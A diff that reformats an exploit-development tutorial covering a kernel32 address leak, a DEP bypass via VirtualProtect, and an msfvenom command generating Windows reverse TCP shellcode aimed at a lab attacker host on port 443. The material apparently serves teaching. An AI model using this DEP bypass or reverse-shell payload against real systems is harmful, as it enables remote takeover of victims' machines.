@@ -1373,7 +1373,7 @@ Also we can see that the leaked <b>kernel32</b> address is loaded into EAX.
 
 
 <p align="justify">
-At this point we can calculate the <b>VirtualProtect</b> address using the leaked **kernel32** address from the stack.
+At this point we can calculate the <b>VirtualProtect</b> address using the leaked <b>kernel32</b> address from the stack.
 </p>
 
 * * *
@@ -1614,7 +1614,9 @@ As shown above in red, after executing the last gadget, the address of <b>Virtua
 
 ### 7. Bypassing DEP
 
-This section shows how to bypass DEP by using **VirtualProtect** in order to set the access protection to **PAGE\_EXECUTE\_READWRITE** on the memory region containing the shellcode. The following parameters must be specified in order to successfully execute **VirtualProtect** :
+<p align="justify">
+This section shows how to bypass DEP by using <b>VirtualProtect</b> in order to set the access protection to <b>PAGE_EXECUTE_READWRITE</b> on the memory region containing the shellcode. The following parameters must be specified in order to successfully execute <b>VirtualProtect</b> :
+</p>
 
 ```
 BOOL WINAPI VirtualProtect(
@@ -1737,7 +1739,7 @@ The first two lines above will align our return after executing. To achieve this
 The following reverse TCP shellcode will be used in order to exploit the buffer overflow vulnerability.&nbsp;
 </p>
 
-From msfvenom we generate the reverse TCP shellcode :
+From **msfvenom** we generate the reverse TCP shellcode :
 
 ```
 root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.201.7 LPORT=443 EXITFUNC=thread  -b "\x00" -f  python
